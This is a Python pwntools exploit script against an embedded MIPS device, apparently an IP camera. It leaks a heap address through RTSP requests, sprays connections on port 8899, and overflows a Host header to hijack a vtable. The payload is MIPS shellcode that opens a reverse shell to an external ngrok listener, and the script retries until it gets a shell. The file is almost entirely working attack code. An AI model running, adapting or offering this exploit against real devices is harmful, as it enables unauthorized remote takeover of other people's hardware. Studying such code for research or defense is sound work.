#!/usr/bin/env python3

from pwn import *
import socket
import time

context.update(arch='mips', os='linux', bits=32, endian='little')

# prepare your reverse shell listener here
LHOST = "0.tcp.jp.ngrok.io"
LPORT = 12057

IP = "192.168.0.104"

print('prep vtable and shellcode!')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, 554))

s.sendall(b"OPTIONS rtsp://192.168.0.104:554/stream_ch00_0 RTSP/1.0\r\nCSeq: 1\r\n\r\n")
data = s.recv(1024)

s.sendall(b"SETUP rtsp://192.168.0.104:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
data = s.recv(1024)

s.sendall(b"PAUSE rtsp://192.168.0.104:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
data = s.recv(1024)

chyrtsp_this = int(data.split(b'Session: ')[1][:8], 16)
reqbuf = chyrtsp_this + 0x7c

print(f'vtable: {reqbuf:#010x}')

pl = p32(reqbuf + 0x100) * (0x100 // 4)
#pl = p32(0x00625030) * (0x100 // 4)        # run_reboot + ...
#pl += b'\xff\xff\x00\x10\x00\x00\x00\x00'  # .L1: beq $0, $0, .L1
#pl += b'\x0c\x94\x18\x08\x00\x00\x00\x00'   # j 0x00625030
pl += asm(
    shellcraft.fork() +
    """
    bgtz $v0, infloop_st
    """ +
    shellcraft.connect(LHOST, LPORT) +
    shellcraft.dupsh() +
    """
    infloop_st:
        addiu $sp, -0x8
        li $t8, 3600
        sw $t8, 0($sp)
        sw $t8, 4($sp)
    infloop:
    """ +
    shellcraft.nanosleep("$sp", 0) +
    """
        beq $0, $0, infloop
        nop
    """
)

assert all(c not in p32(reqbuf)[:3] for c in b':\0')
s.sendall(pl)
time.sleep(1)

SPRAY, TGT = 0x8, 0x4

print('spray!')
ss = []
for i in range(SPRAY):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, 8899))
    ss.append(sock)

for i in range(SPRAY):
    ss[i].sendall(b"Host: " + b"TEST"*(0x100 // 0x4) + b":12345\r\n")

time.sleep(1)

print('overwrite!')
pl2 = b"Host: " + b"A"*0x100 + b"CTLN" + b"CKSZ" + b"VTL1" + p32(reqbuf)[:3] + b":12345\r\n"
ss[TGT].sendall(pl2)

time.sleep(1)

print(f'trigger @ {TGT}!')
for i in range(SPRAY):
    ss[i].sendall(b"a")

for retry_idx in list(range(TGT + 1, SPRAY)) + list(range(0, TGT)):
    input("if you didn't get shell, press enter to try more! > ")
    print(f"trying with index {retry_idx}...")
    ss[retry_idx].sendall(pl2)
    time.sleep(1)
    for i in range(SPRAY):
        ss[i].sendall(b"a")

